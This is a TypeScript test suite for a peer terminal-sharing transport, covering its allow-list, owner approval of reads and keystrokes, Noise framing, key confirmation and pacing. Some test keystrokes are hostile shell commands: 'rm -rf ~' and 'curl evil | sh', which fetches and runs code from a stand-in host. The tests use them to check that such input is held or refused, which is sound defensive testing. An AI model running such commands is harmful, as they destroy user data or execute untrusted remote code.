// The peer transport on its own: Noise session real, relay replaced by handing
// one side's bytes straight to the other. Guards the allow-list and the framing
// of messages past Noise's 65535-byte transport ceiling.

import { describe, expect, it } from 'vitest'
import { z } from 'zod'
import { MAX_REMOTE_WRITE_BYTES, MAX_TERMINAL_ID_CHARS, Params } from '../../shared/methods'
import { createInitiatorSession, createResponderSession, generateStaticKeyPair } from '../../shared/peer'
import type { PeerSession } from '../../shared/peer'
import { ErrorCode } from '../../shared/protocol'
import { createDispatcher } from './dispatcher'
import { MethodRegistry } from './methodRegistry'
import {
  createPeerTransport,
  MAX_PEER_SUBSCRIPTIONS,
  PEER_CALL_TIMEOUT_MS,
  PEER_METHODS,
  STREAM_BUFFER_BYTES,
  STREAM_FLUSH_MS,
  type PeerTransport,
  type RemoteReadVerdict,
  type RemoteWriteDecision,
  type RemoteWriteRequest,
  type RemoteWriteVerdict,
  type TransportFailure,
  type TransportScheduler
} from './peerTransport'
import { createRuntimeContext } from './runtimeContext'
import { SubscriptionHub } from './subscriptionHub'

/** A clock a test moves by hand, so pacing is asserted rather than waited out. */
function manualClock(): TransportScheduler & {
  advance: (ms: number) => void
  /** A suspended machine: the wall clock moves, no timer runs, and then it wakes. */
  sleep: (ms: number) => void
  pending: () => number
} {
  let now = 1_000
  // Kept apart from the wall clock so a deadline can see the two disagree.
  let monotonic = 0
  const timers = new Map<number, { at: number; run: () => void }>()
  let sequence = 0
  const runDue = (target: number): void => {
    for (;;) {
      const due = [...timers.entries()].filter(([, timer]) => timer.at <= target).sort((a, b) => a[1].at - b[1].at)
      const next = due[0]
      if (!next) break
      timers.delete(next[0])
      const step = Math.max(0, next[1].at - monotonic)
      monotonic += step
      now += step
      next[1].run()
    }
  }
  return {
    now: () => now,
    monotonicNow: () => monotonic,
    setTimer: (run, delayMs) => {
      sequence += 1
      const id = sequence
      timers.set(id, { at: monotonic + Math.max(0, delayMs), run })
      return () => {
        timers.delete(id)
      }
    },
    advance: (ms) => {
      const target = monotonic + ms
      const wallTarget = now + ms
      runDue(target)
      monotonic = target
      now = wallTarget
    },
    sleep: (ms) => {
      // macOS's monotonic clock counts time spent suspended, so waking fires every
      // overdue timer at once having measured far longer than it was armed for.
      now += ms
      monotonic += ms
      runDue(monotonic)
    },
    pending: () => timers.size
  }
}

/** Two halves of one completed IK handshake, with nothing in between. */
function handshakenPair(): [PeerSession, PeerSession] {
  const initiatorKeys = generateStaticKeyPair()
  const responderKeys = generateStaticKeyPair()
  const initiator = createInitiatorSession({
    staticPrivateKey: initiatorKeys.privateKey,
    remoteStaticPublicKey: responderKeys.publicKey
  })
  const responder = createResponderSession({
    staticPrivateKey: responderKeys.privateKey,
    isAuthorisedPeer: () => true
  })
  responder.readHandshakeMessage(initiator.writeHandshakeMessage())
  initiator.readHandshakeMessage(responder.writeHandshakeMessage())
  return [initiator, responder]
}

type Rig = {
  /** The transport a teammate's runtime would have. */
  caller: PeerTransport
  /** The transport answering on this machine, with the registry behind it. */
  answerer: PeerTransport
  registry: MethodRegistry
  hub: SubscriptionHub
  /** Every stream event the teammate received, in order. */
  received: { stream: string; event: unknown }[]
  /** Every keystroke that reached a pane on the answering side, in order. */
  written: string[]
  /** The panes the answering side believes the teammate has open. */
  watched: () => readonly string[]
  /** Pushes one event into a pane the teammate subscribed to. */
  pane: (terminalId: string) => { emit: (event: unknown) => void; close: () => void } | undefined
  clock: ReturnType<typeof manualClock>
}

type RigOptions = {
  allowedMethods?: readonly Parameters<MethodRegistry['register']>[0][]
  /** The owner's verdict on a keystroke. Left out to prove nothing writes without one. */
  onRemoteWrite?: (write: RemoteWriteRequest) => RemoteWriteVerdict
  /** The owner's verdict on a read. Allowed by default; the missing-judge refusal has its own test. */
  onRemoteRead?: (terminalId: string) => RemoteReadVerdict
  /** Builds a transport with no read judge at all, to prove reads stop without one. */
  bareRead?: boolean
  /** Run when the answering side first decrypts anything, as key confirmation is. */
  onConfirmed?: (transport: PeerTransport) => void
  /** A clock for the calling side, which otherwise runs on the real one. */
  callerScheduler?: TransportScheduler
}

/** Two transports wired mouth to ear. Delivery is synchronous: the property under test is message boundaries. */
function rig(allowedMethods?: readonly Parameters<MethodRegistry['register']>[0][], options?: RigOptions): Rig {
  const [callerSession, answererSession] = handshakenPair()
  const hub = new SubscriptionHub()
  const clock = manualClock()
  const received: { stream: string; event: unknown }[] = []
  const written: string[] = []
  const panes = new Map<string, { emit: (event: unknown) => void; close: () => void }>()
  let watched: readonly string[] = []
  const registry = new MethodRegistry(createRuntimeContext({ version: 't', store: {} as never, subscriptions: hub }))

  // Stands in for the terminal service; the wire is under test, not the pty.
  registry.register('terminal.subscribe', Params.terminalSubscribe, (params, call) => ({
    subscription: hub.subscribe(call.connectionId, (channel) => {
      panes.set(params.terminalId, channel)
      return () => panes.delete(params.terminalId)
    })
  }))
  registry.register('terminal.read', Params.terminalRead, () => ({ data: 'scrollback\r\n' }))
  registry.register('unsubscribe', Params.unsubscribe, (params, call) => ({
    unsubscribed: hub.unsubscribe(call.connectionId, params.subscription) as true
  }))

  registry.register('status.get', z.object({}), () => ({
    version: 't',
    endpoint: '',
    pid: 1,
    platform: 'linux' as NodeJS.Platform,
    startedAt: 0
  }))
  registry.register('peer.presence', z.object({}), () => ({ revision: 1, handle: 'them', projects: [] }))
  registry.register('worktree.remove', z.object({ worktreeId: z.string() }), () => ({ removed: true as const }))
  // Everything that reached a pane, so "refused" is asserted as nothing having happened.
  registry.register('terminal.write', Params.terminalWrite, (params) => {
    written.push(params.data)
    return { written: true as const }
  })

  let answerer: PeerTransport
  const caller = createPeerTransport({
    session: callerSession,
    send: (message) => answerer.receive(message),
    dispatch: createDispatcher(
      new MethodRegistry(
        createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
      )
    ),
    subscriptions: new SubscriptionHub(),
    connectionId: 'peer_caller',
    onStreamEvent: (stream, event) => received.push({ stream, event }),
    ...(options?.callerScheduler ? { scheduler: options.callerScheduler } : {}),
    onFatal: () => {}
  })
  answerer = createPeerTransport({
    session: answererSession,
    send: (message) => caller.receive(message),
    dispatch: createDispatcher(registry),
    subscriptions: hub,
    connectionId: 'peer_answerer',
    scheduler: clock,
    onWatchChange: (terminalIds) => {
      watched = terminalIds
    },
    ...(allowedMethods ? { allowedMethods } : {}),
    ...(options?.onRemoteWrite ? { onRemoteWrite: options.onRemoteWrite } : {}),
    ...(options?.bareRead === true
      ? {}
      : { onRemoteRead: options?.onRemoteRead ?? ((): RemoteReadVerdict => ({ ok: true })) }),
    ...(options?.onConfirmed ? { onConfirmed: () => options.onConfirmed?.(answerer) } : {}),
    onFatal: () => {}
  })

  return {
    caller,
    answerer,
    registry,
    hub,
    received,
    written,
    clock,
    watched: () => watched,
    pane: (terminalId) => panes.get(terminalId)
  }
}

/** Everything one stream carried, concatenated, as the watcher would see it. */
function outputOn(received: readonly { stream: string; event: unknown }[]): string {
  return received
    .filter((frame): frame is { stream: string; event: { type: 'data'; data: string } } => isData(frame.event))
    .map((frame) => frame.event.data)
    .join('')
}

function isData(event: unknown): boolean {
  return typeof event === 'object' && event !== null && (event as { type?: unknown }).type === 'data'
}

describe('what a teammate can reach', () => {
  it('answers a method on the peer allow-list', async () => {
    const { caller } = rig()
    await expect(caller.call('peer.presence', {})).resolves.toMatchObject({ revision: 1 })
  })

  it('refuses a method that is registered but not a teammate’s to call', async () => {
    const { caller } = rig()
    // Registered, reachable over IPC and the CLI socket, and not a teammate's to call.
    await expect(caller.call('worktree.remove', { worktreeId: 'wt_1' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })
  })

  it('lets a teammate read a pane and type into one, and reach nothing else', () => {
    // Asserted whole, so widening the list is a deliberate edit to one line and
    // never a side effect of registering a handler. Resize and close stay off it.
    expect(Object.keys(PEER_METHODS).sort()).toEqual([
      'peer.presence',
      'peer.subscribe',
      'terminal.read',
      'terminal.subscribe',
      'terminal.write',
      'unsubscribe'
    ])
    expect(PEER_METHODS).not.toHaveProperty('terminal.resize')
    expect(PEER_METHODS).not.toHaveProperty('terminal.close')
    // No symlink into /usr/local/bin, no password dialog on somebody else's screen.
    expect(PEER_METHODS).not.toHaveProperty('cli.install')
    expect(PEER_METHODS).not.toHaveProperty('cli.status')
    expect(PEER_METHODS).not.toHaveProperty('cli.dismissPrompt')
    // Nor does a teammate get to start a program on somebody else's machine.
    expect(PEER_METHODS).not.toHaveProperty('editor.list')
    expect(PEER_METHODS).not.toHaveProperty('editor.open')
    expect(PEER_METHODS).not.toHaveProperty('file.read')
    expect(PEER_METHODS).not.toHaveProperty('file.write')
    // Nor ask GitHub anything, change a preference, or open a page in a browser.
    expect(PEER_METHODS).not.toHaveProperty('update.check')
    expect(PEER_METHODS).not.toHaveProperty('update.download')
    expect(PEER_METHODS).not.toHaveProperty('update.setAutomatic')
    expect(PEER_METHODS).not.toHaveProperty('update.state')
  })

  it('says of every admitted method which project check it goes through', () => {
    // The list is the table of scopes: a method with no scope is a type error,
    // and only this test stops it having the wrong one.
    expect(PEER_METHODS).toEqual({
      // About this link; answer with what it is already entitled to.
      'peer.presence': 'link',
      'peer.subscribe': 'link',
      unsubscribe: 'link',
      // Name a pane, and may only have it if the asker shares its project.
      'terminal.read': 'read-pane',
      'terminal.subscribe': 'read-pane',
      // The one that runs code, judged separately from the ones that only look.
      'terminal.write': 'write-pane'
    })
  })

  it('will not let a pane method through without the owner having judged it', async () => {
    // Every method scoped to a pane is refused when there is no judge to scope it with.
    for (const [method, scope] of Object.entries(PEER_METHODS)) {
      if (scope === 'link') continue
      const { caller } = rig([method as never], { bareRead: true })
      await expect(caller.call(method as 'terminal.read', { terminalId: 't1' } as never)).rejects.toBeTruthy()
    }
  })

  it('bounds the pane id a read names, not only the one a keystroke names', async () => {
    // The id on a read is copied into the map of what this link streams and out
    // to whoever is told who is reading; bounded like the id on a write.
    const { caller } = rig()
    await expect(
      caller.call('terminal.read', { terminalId: 'x'.repeat(MAX_TERMINAL_ID_CHARS + 1) })
    ).rejects.toMatchObject({ code: ErrorCode.InvalidParams })
    await expect(
      caller.call('terminal.subscribe', { terminalId: 'x'.repeat(MAX_TERMINAL_ID_CHARS + 1) })
    ).rejects.toMatchObject({ code: ErrorCode.InvalidParams })
  })

  it('refuses a keystroke when nothing is there to attribute it to', async () => {
    // Without `onRemoteWrite` nothing can say whose bytes these are, so they are
    // not carried. "On the allow-list" and "allowed" are two different things.
    const { caller, written } = rig(['terminal.write'])
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'x' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })
    expect(written).toEqual([])
  })

  it('refuses a read when nothing is there to scope it to', async () => {
    // Without `onRemoteRead` the transport cannot tell which project this teammate
    // reached it through, and must not guess. `rig` supplies a judge by default.
    const { caller } = rig(['terminal.read', 'terminal.subscribe'], { onRemoteRead: undefined, bareRead: true })
    await expect(caller.call('terminal.read', { terminalId: 't_1' })).rejects.toMatchObject({
      code: ErrorCode.NotFound
    })
    await expect(caller.call('terminal.subscribe', { terminalId: 't_1' })).rejects.toMatchObject({
      code: ErrorCode.NotFound
    })
  })

  it('asks the owner about every read, and streams only the panes they allow', async () => {
    // Reading was on the allow-list and nothing scoped it, so a teammate could
    // name any pane on the machine. Typing has been scoped since it was built.
    const asked: string[] = []
    const { caller } = rig(['terminal.read', 'terminal.subscribe'], {
      onRemoteRead: (terminalId) => {
        asked.push(terminalId)
        return terminalId === 't_ours'
          ? { ok: true }
          : { ok: false, code: ErrorCode.NotFound, message: `there is no pane ${terminalId} in this project` }
      }
    })

    await expect(caller.call('terminal.read', { terminalId: 't_ours' })).resolves.toBeDefined()
    await expect(caller.call('terminal.subscribe', { terminalId: 't_theirs' })).rejects.toMatchObject({
      code: ErrorCode.NotFound,
      // Reported exactly as a pane that does not exist, so a teammate cannot ask
      // whether a pane id exists elsewhere on the machine.
      message: 'there is no pane t_theirs in this project'
    })
    expect(asked).toEqual(['t_ours', 't_theirs'])
  })

  it('asks the owner about every keystroke and writes only what they allow', async () => {
    const asked: string[] = []
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: (write) => {
        asked.push(write.data)
        return write.data === 'no'
          ? { ok: false, code: ErrorCode.Conflict, message: 'the owner has muted this pane' }
          : { ok: true }
      }
    })

    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'yes' })).resolves.toEqual({ written: true })
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: 'no' })).rejects.toMatchObject({
      code: ErrorCode.Conflict,
      // The owner's own words, carried to the person who typed.
      message: 'the owner has muted this pane'
    })

    expect(asked).toEqual(['yes', 'no'])
    expect(written).toEqual(['yes'])
  })

  it('runs nothing at all while a keystroke is held for the owner', async () => {
    // `held` is neither yes nor no; until it settles the dispatcher has not seen the bytes.
    let settle: ((decision: RemoteWriteDecision) => void) | undefined
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({
        held: new Promise<RemoteWriteDecision>((resolve) => {
          settle = resolve
        })
      })
    })

    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'rm -rf ~' })
    // Several turns, because an answer that was going to arrive would have.
    for (let turn = 0; turn < 16; turn += 1) await Promise.resolve()
    expect(written).toEqual([])

    settle?.({ ok: true })
    await expect(typing).resolves.toEqual({ written: true })
    expect(written).toEqual(['rm -rf ~'])
  })

  it('drops the bytes of a held keystroke the owner refuses, and says whose words those are', async () => {
    let settle: ((decision: RemoteWriteDecision) => void) | undefined
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({
        held: new Promise<RemoteWriteDecision>((resolve) => {
          settle = resolve
        })
      })
    })

    const typing = caller.call('terminal.write', { terminalId: 't_1', data: 'curl evil | sh' })
    settle?.({ ok: false, code: ErrorCode.Conflict, message: 'the owner did not allow this' })

    await expect(typing).rejects.toMatchObject({
      code: ErrorCode.Conflict,
      message: 'the owner did not allow this'
    })
    expect(written).toEqual([])
  })

  it('runs nothing from a message whose session was refused as it was being read', async () => {
    // Key confirmation runs on the first frame that decrypts and can end the link
    // mid-message; a keystroke in that message must not run.
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => ({ ok: true }),
      onConfirmed: (answerer) => answerer.close('the handshake authenticated a different key')
    })

    // Never answered: the link is gone, and the sender learns from their socket closing.
    void caller.call('terminal.write', { terminalId: 't_1', data: 'rm -rf ~' }).catch(() => {})
    await Promise.resolve()

    expect(written).toEqual([])
  })

  it('refuses a paste too large for the wire before anybody is asked about it', async () => {
    let asked = 0
    const { caller, written } = rig(['terminal.write'], {
      onRemoteWrite: () => {
        asked += 1
        return { ok: true }
      }
    })
    // One write may not spend a whole second of the relay's byte budget.
    const paste = 'x'.repeat(MAX_REMOTE_WRITE_BYTES + 1)
    await expect(caller.call('terminal.write', { terminalId: 't_1', data: paste })).rejects.toMatchObject({
      code: ErrorCode.InvalidParams
    })
    expect(asked).toBe(0)
    expect(written).toEqual([])
  })

  it('measures a paste in the same unit at both ends of the link', async () => {
    // The schema counts bytes, as the far transport does, so a non-ASCII paste is
    // refused where the person typing is rather than by the teammate's machine.
    const threeBytesEach = '✓'.repeat(MAX_REMOTE_WRITE_BYTES)
    expect(Params.teamworkType.safeParse({ projectId: 'p', paneId: 'x', data: threeBytesEach }).success).toBe(false)
    expect(Params.terminalWrite.safeParse({ terminalId: 't', data: threeBytesEach }).success).toBe(false)
    // And an ordinary paste of the same byte size is still fine.
    const atTheLimit = 'x'.repeat(MAX_REMOTE_WRITE_BYTES)
    expect(Params.teamworkType.safeParse({ projectId: 'p', paneId: 'x', data: atTheLimit }).success).toBe(true)
    expect(Params.terminalWrite.safeParse({ terminalId: 't', data: atTheLimit }).success).toBe(true)
  })

  it('widens by exactly the list it is given, which is how C plugs in', async () => {
    const { caller } = rig(['peer.presence', 'status.get'])
    await expect(caller.call('status.get', {})).resolves.toMatchObject({ version: 't' })
  })
})

describe('framing', () => {
  it('carries a message far larger than one Noise transport message', async () => {
    const { caller, registry } = rig(['peer.presence'])
    // Well past the 65535-byte ceiling, so it has to be cut and reassembled.
    const huge = 'x'.repeat(400_000)
    registry.register('peer.presence', z.object({}), () => ({
      revision: 1,
      handle: huge,
      projects: []
    }))
    const answer = await caller.call('peer.presence', {})
    expect(answer.handle).toHaveLength(400_000)
  })

  it('keeps a multi-byte character whole across a chunk boundary', async () => {
    const { caller, registry } = rig(['peer.presence'])
    // A boundary lands inside a four-byte character; decoded eagerly it becomes U+FFFD.
    const emoji = '🛠'.repeat(40_000)
    registry.register('peer.presence', z.object({}), () => ({ revision: 1, handle: emoji, projects: [] }))
    const answer = await caller.call('peer.presence', {})
    expect(answer.handle).toBe(emoji)
  })

  it('ends the link when a message does not authenticate, rather than carrying on', () => {
    const [session] = handshakenPair()
    let fatal: TransportFailure | undefined
    const transport = createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_x',
      onFatal: (failure) => {
        fatal = failure
      }
    })

    // Forged, reordered or replayed: Noise transport has no nonce on the wire and
    // no replay window, so all three mean the stream cannot be resynchronised.
    transport.receive(new Uint8Array(64))
    expect(fatal).toBeTruthy()
    // Named as what it is, because the caller puts a sentence on a screen.
    expect(fatal?.kind).toBe('unauthenticated')
  })
})

describe('key confirmation', () => {
  it('does not fire on a handshake that merely completed', () => {
    // A responder finishes IK having only written message 2, so a replayer with a
    // captured message 1 reaches `established` carrying the real peer's static key.
    const [session] = handshakenPair()
    let confirmed = false
    createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_x',
      onConfirmed: () => {
        confirmed = true
      },
      onFatal: () => {}
    })
    expect(confirmed).toBe(false)
  })

  it('fires on the first transport message that authenticates, and only once', () => {
    const [alice, bob] = handshakenPair()
    let confirmations = 0
    const receiver = createPeerTransport({
      session: bob,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_y',
      onConfirmed: () => {
        confirmations += 1
      },
      onFatal: () => {}
    })

    // An empty keepalive: proof the sender holds keys a recording cannot supply.
    receiver.receive(alice.encrypt(new TextEncoder().encode('\n')))
    expect(confirmations).toBe(1)
    receiver.receive(alice.encrypt(new TextEncoder().encode('\n')))
    expect(confirmations).toBe(1)
  })

  it('never fires for a sender who cannot produce a valid transport message', () => {
    const [session] = handshakenPair()
    let confirmed = false
    let fatal = false
    const transport = createPeerTransport({
      session,
      send: () => {},
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_z',
      onConfirmed: () => {
        confirmed = true
      },
      onFatal: () => {
        fatal = true
      }
    })

    // What a replayer has: the ability to open a connection, and nothing to say.
    transport.receive(new Uint8Array(48))
    expect(confirmed).toBe(false)
    expect(fatal).toBe(true)
  })
})

describe('subscriptions a teammate opened', () => {
  it('releases them when the link ends, so nothing outlives the machine that asked', async () => {
    const { caller, answerer, hub, registry } = rig(['peer.subscribe'])
    registry.register('peer.subscribe', z.object({}), (_params, call) => ({
      subscription: hub.subscribe(call.connectionId, () => () => {})
    }))

    await caller.call('peer.subscribe', {})
    expect(hub.countFor('peer_answerer')).toBe(1)

    answerer.close('the teammate went away')
    expect(hub.countFor('peer_answerer')).toBe(0)
  })

  it('refuses a new stream once the teammate holds too many, rather than opening them without limit', async () => {
    const { caller, hub } = rig()

    const held: string[] = []
    for (let pane = 0; pane < MAX_PEER_SUBSCRIPTIONS; pane += 1) {
      held.push((await caller.call('terminal.subscribe', { terminalId: `t${pane}` })).subscription)
    }
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)

    // Refused with a reason a teammate can act on; every record past the ceiling
    // is a pacing buffer this machine keeps on somebody else's say-so.
    await expect(caller.call('terminal.subscribe', { terminalId: 'one_too_many' })).rejects.toMatchObject({
      code: ErrorCode.Conflict
    })
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)

    // A ceiling and not a fuse: a teammate who closes a pane may open another.
    await caller.call('unsubscribe', { subscription: held[0]! })
    await expect(caller.call('terminal.subscribe', { terminalId: 'one_more' })).resolves.toMatchObject({
      subscription: expect.any(String) as unknown as string
    })
    expect(hub.countFor('peer_answerer')).toBe(MAX_PEER_SUBSCRIPTIONS)
  })
})

describe('a pane against the relay’s budget', () => {
  it('merges a burst into one frame instead of spending the relay’s frame budget', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    // The first chunk after a pause goes straight out.
    channel?.emit({ type: 'data', data: 'first\r\n' })
    expect(received).toHaveLength(1)

    // The rest of the burst leaves as one frame; concatenating chunks is lossless.
    for (let chunk = 0; chunk < 50; chunk += 1) channel?.emit({ type: 'data', data: `line ${chunk}\r\n` })
    expect(received).toHaveLength(1)

    clock.advance(STREAM_FLUSH_MS)
    expect(received).toHaveLength(2)
    expect(outputOn(received)).toContain('line 0\r\nline 1\r\n')
    expect(outputOn(received)).toContain('line 49\r\n')
  })

  it('tells the watcher how much it threw away rather than dropping output silently', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'x' })
    // Far past what may wait for the wire: the head goes, with a count of what went.
    const overflow = 'y'.repeat(STREAM_BUFFER_BYTES * 2)
    channel?.emit({ type: 'data', data: overflow })
    clock.advance(STREAM_FLUSH_MS)

    const elided = received.find((frame) => (frame.event as { type?: string }).type === 'elided')?.event as
      | { type: string; bytes: number }
      | undefined
    expect(elided?.type).toBe('elided')
    expect(elided?.bytes ?? 0).toBeGreaterThanOrEqual(STREAM_BUFFER_BYTES)
    // What survived is the end of the burst, not the beginning of it.
    expect(outputOn(received).endsWith('y')).toBe(true)
  })

  it('never throws away an exit, because a pane that finished is a fact and not a volume', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'z'.repeat(STREAM_BUFFER_BYTES * 3) })
    channel?.emit({ type: 'exit', exitCode: 0 })
    // The byte budget is spent over several flushes; the exit must still be there.
    for (let tick = 0; tick < 200; tick += 1) clock.advance(STREAM_FLUSH_MS)

    expect(received.map((frame) => frame.event)).toContainEqual({ type: 'exit', exitCode: 0 })
  })

  it('keeps an exit behind the output it follows, so a pane never finishes before it speaks', async () => {
    const { caller, received, pane, clock } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    const channel = pane('t1')

    channel?.emit({ type: 'data', data: 'a' })
    channel?.emit({ type: 'data', data: 'b' })
    channel?.emit({ type: 'exit', exitCode: 0 })
    clock.advance(STREAM_FLUSH_MS)

    const types = received.map((frame) => (frame.event as { type: string }).type)
    expect(types.indexOf('exit')).toBeGreaterThan(types.lastIndexOf('data'))
  })
})

describe('what the owner is told about who is reading', () => {
  it('names the pane a teammate opened, and forgets it when they close it', async () => {
    const { caller, watched } = rig()
    const { subscription } = await caller.call('terminal.subscribe', { terminalId: 't1' })
    expect(watched()).toEqual(['t1'])

    await caller.call('unsubscribe', { subscription })
    expect(watched()).toEqual([])
  })

  it('sends what the pane had already printed before saying the owner closed it', async () => {
    // `session-manager.ts` calls `endStreamsFor(terminalId)` before
    // `session.close()`, so the producer ends the channel while the pacer still
    // holds a flush interval of output and the exit behind it. None may be lost.
    const { caller, received, pane } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })

    // Out at once: the leading edge sends a pane that has been quiet.
    pane('t1')?.emit({ type: 'data', data: 'FIRST' })
    // Held: inside the flush interval, so this is armed rather than written.
    pane('t1')?.emit({ type: 'data', data: 'HELD-BY-PACER' })
    pane('t1')?.emit({ type: 'exit', exitCode: 3 })
    pane('t1')?.close()

    const events = received.map((frame) => frame.event)
    expect(events).toContainEqual({ type: 'data', data: 'HELD-BY-PACER' })
    expect(events).toContainEqual({ type: 'exit', exitCode: 3 })
    // And in that order: last output, exit, then the news that it is gone.
    const types = events.map((event) => (event as { type: string }).type)
    expect(types.indexOf('exit')).toBeGreaterThan(types.lastIndexOf('data'))
    expect(types.lastIndexOf('lost')).toBeGreaterThan(types.indexOf('exit'))
  })

  it('forgets a pane whose stream the owner ended, and says so rather than going quiet', async () => {
    const { caller, received, pane, watched } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    expect(watched()).toEqual(['t1'])

    // The owner closing their own pane: the producer ends the stream and nothing else tells the reader.
    pane('t1')?.close()

    expect(watched()).toEqual([])
    expect(received.map((frame) => frame.event)).toContainEqual({
      type: 'lost',
      reason: 'the owner closed this pane'
    })
  })

  it('reports one pane per teammate however many streams they hold on it', async () => {
    const { caller, watched } = rig()
    await caller.call('terminal.subscribe', { terminalId: 't1' })
    await caller.call('terminal.subscribe', { terminalId: 't1' })

    expect(watched()).toEqual(['t1'])
  })

  it('says nobody is reading a pane a teammate asked for and was refused', async () => {
    const { caller, watched } = rig(['peer.presence', 'unsubscribe'])
    await expect(caller.call('terminal.subscribe', { terminalId: 't1' })).rejects.toMatchObject({
      code: ErrorCode.UnknownMethod
    })

    expect(watched()).toEqual([])
  })
})

describe('a call the teammate never answers', () => {
  /** One transport shouting into a socket nobody reads: what a shut laptop leaves. */
  function intoTheVoid(): { transport: PeerTransport; clock: ReturnType<typeof manualClock>; sent: number } {
    const [session] = handshakenPair()
    const clock = manualClock()
    const state = { sent: 0 }
    const transport = createPeerTransport({
      session,
      send: () => {
        state.sent += 1
      },
      dispatch: createDispatcher(
        new MethodRegistry(
          createRuntimeContext({ version: 't', store: {} as never, subscriptions: new SubscriptionHub() })
        )
      ),
      subscriptions: new SubscriptionHub(),
      connectionId: 'peer_void',
      scheduler: clock,
      onFatal: () => {}
    })
    return {
      transport,
      clock,
      get sent() {
        return state.sent
      }
    }
  }

  it('rejects with a reason a person can be shown rather than waiting for ever', async () => {
    const { transport, clock } = intoTheVoid()
    const answer = transport.call('peer.presence', {}).then(
      () => 'answered',
      (error: unknown) => (error instanceof Error ? error.message : String(error))
    )

    // Up to the deadline it is still outstanding: a slow link is not a dead one.
    clock.advance(PEER_CALL_TIMEOUT_MS - 1)
    expect(await Promise.race([answer, Promise.resolve('waiting')])).toBe('waiting')

    clock.advance(1)
    await expect(answer).resolves.toMatch(/did not answer/)
  })

  it('does not blame the teammate for a deadline this machine slept through', async () => {
    const { transport, clock } = intoTheVoid()
    const answer = transport.call('peer.presence', {}).then(
      () => 'answered',
      (error: unknown) => (error instanceof Error ? error.message : String(error))
    )

    // The thirty seconds were spent with the lid shut, so nobody failed to answer
    // in them; the call still settles, and with the truth.
    clock.sleep(3_600_000)
    const said = await answer
    expect(said).not.toMatch(/did not answer/)
    expect(said).toMatch(/asleep/)
  })

  it('lets go of the deadline the moment the answer lands', async () => {
    const clock = manualClock()
    const { caller } = rig(undefined, { callerScheduler: clock })
    await expect(caller.call('peer.presence', {})).resolves.toMatchObject({ revision: 1 })

    // A call that is over holds nothing; otherwise one live timer per frame ever asked for.
    expect(clock.pending()).toBe(0)
  })
})
